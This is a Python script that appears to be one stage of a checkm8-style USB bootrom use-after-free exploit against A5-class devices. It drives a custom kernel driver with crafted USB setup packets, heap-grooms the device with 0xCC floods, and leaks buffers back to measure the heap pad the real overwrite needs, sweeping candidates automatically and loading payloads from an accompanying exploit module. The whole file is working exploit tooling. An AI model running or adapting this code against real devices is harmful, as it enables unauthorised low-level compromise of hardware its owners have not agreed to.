#!/usr/bin/env python3
"""pwn-padprobe.py - live UAF-pad discovery via write-then-leak.

Per serving window:
  1. ARM (crit-IN 0x81) + read back the serve tail (heap adjacency)
  2. CC-flood the candidate pad P (bogus wLength 0x40, P x 0xCC,
     NO overwrite bytes - a miss cannot crash the chip)
  3. crit-IN leak again and scan the serve for 0xCC bands:
       - CCs found at offset D from the new io_buffer base means the
         flood from the previous serve's buffer reached the current
         one at -D; the sketch's fc->target adjacency = this class.
  4. On discovery, report the offsets; the real UAF (with the 64B
     overwrite) then fires with the measured pad.
The 0xCC flood is pure garbage; each miss degrades the heap by dead
bytes only - safe to sweep candidates window-per-window.

looper: PR -> capture-epoch wait -> probe sweep -> discoveries.
"""
import ctypes
import fcntl
import importlib.util
import os
import struct
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(REPO, 'tools')

sp = importlib.util.spec_from_file_location('pwn', os.path.join(TOOLS, 'checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(sp)
sp.loader.exec_module(P)

IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
IOC_STATE = (2 << 30) | (40 << 16) | (ord('R') << 8) | 3
RB_SIZE = 4 + 4 + 0x1000
IOC_RW = (3 << 30) | (RB_SIZE << 16) | (ord('R') << 8) | 7
IOC_PORTRESET = (3 << 30) | (16 << 16) | (ord('R') << 8) | 12
IOC_RESETDEV = (0 << 30) | (0 << 16) | (ord('R') << 8) | 10

PROBE = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x80, 0x00])
CRIT  = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00])
UAF   = bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00])
DNL   = bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02])


def cyc(fd, setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ', bytes(setup), len(data), 1, 1, 0,
                      settle_us, 0, ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd, IOC_CYC, txn, True)
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def readback(fd, n):
    rb = bytearray(RB_SIZE)
    struct.pack_into('<I', rb, 0, n)
    fcntl.ioctl(fd, IOC_RW, rb, True)
    st, = struct.unpack_from('<I', rb, 4)
    return st, bytes(rb[8:8 + n])


def state(fd):
    buf = bytearray(40)
    fcntl.ioctl(fd, IOC_STATE, buf, True)
    return struct.unpack_from('<QIIIIIIII', buf, 0)


def pr_raw():
    subprocess.run(['sudo', '-n', 'insmod', '/tmp/raw0rb/raw0reset.ko',
                    'bdf=0000:04:00.4', 'port=5', 'mode=1'],
                   capture_output=True, timeout=25)
    subprocess.run(['sudo', '-n', 'rmmod', 'raw0reset'],
                   capture_output=True, timeout=15)


def cc_offsets(data):
    """offsets where 8+ consecutive 0xCC appear"""
    offs = []
    i = 0
    while i < len(data):
        if data[i] == 0xCC:
            j = i
            while j < len(data) and data[j] == 0xCC:
                j += 1
            if j - i >= 8:
                offs.append((i, j - i))
            i = j
        else:
            i += 1
    return offs


def main():
    payload, overwrite = P.load_payloads('classic')
    start = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0x40
    stop = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x800
    pad = start
    print('*** padprobe: CC-flood+sweep candidates %x..%x, '
          'payload=%d overwrite=%d ***' % (start, stop, len(payload), len(overwrite)))

    fd = os.open('/dev/raw0', os.O_RDWR)
    fires = 0
    for r in range(200):
        if pad > stop:
            print('pad sweep complete')
            break
        print('== round %d (pad 0x%03x) ==' % (r, pad))
        # capture epoch (kretprobe refreshes per attempt)
        t0 = time.time()
        f = state(fd)
        if not f[5]:
            pr_raw()
            while time.time() - t0 < 25.0:
                f = state(fd)
                if f[5]:
                    break
                time.sleep(0.005)
        if not f[5]:
            print('   no capture epoch; ladder likely exhausted - replug needed')
            time.sleep(5.0)
            continue

        # probe the window
        t0 = time.time()
        shots = 0
        eio = 0
        served = False
        while time.time() - t0 < 4.0:
            rc = cyc(fd, PROBE, b'\xAA' * 0x80)
            if rc == 0:
                shots += 1
                st, data = readback(fd, 16)
                if data != b'\xAA' * 16:
                    served = True
                    break
            else:
                eio += 1
                if eio == 1:
                    # RESET_DEV once per round to unfreeze a ring head
                    # stalled by a hung kernel TD; repeating it in a
                    # tight loop on a wedged slot crashed the kernel
                    # (measured) - strictly once.
                    try:
                        fcntl.ioctl(fd, IOC_RESETDEV, 0, True)
                        print('   [RESETDEV fired]')
                    except OSError as re_:
                        print('   [RESETDEV errno %d]' % re_.errno)
                    time.sleep(0.4)
                elif eio >= 2:
                    break
        if not served:
            print('   silent (%d shots, %d eio)' % (shots, eio))
            pr_raw()
            continue

        print('   WINDOW (shot %d)' % shots)
        rc = cyc(fd, CRIT, b'\x00' * 0x41)
        st, arm = readback(fd, 0x90)
        pre_cc = cc_offsets(arm)
        print('   ARM rc=%d cc=%r tail64=%s' % (rc, pre_cc, arm[-64:].hex()))

        rc = cyc(fd, UAF, b'\xCC' * pad)
        print('   CC-flood(%dB) rc=%d' % (pad, rc))
        time.sleep(0.05)

        rc = cyc(fd, CRIT, b'\x00' * 0x41)
        st, leak = readback(fd, 0x90)
        post_cc = cc_offsets(leak)
        print('   LEAK rc=%d cc=%r tail64=%s' % (rc, post_cc, leak[-64:].hex()))

        if post_cc and not pre_cc:
            print('*** DISCOVERY: pad 0x%03x shows CC at %r ***>'
                  % (pad, post_cc))
        pad += 0x40

        # chip survives CC misses - keep sweeping within the epoch

    os.close(fd)
    return 0


if __name__ == '__main__':
    sys.exit(main())
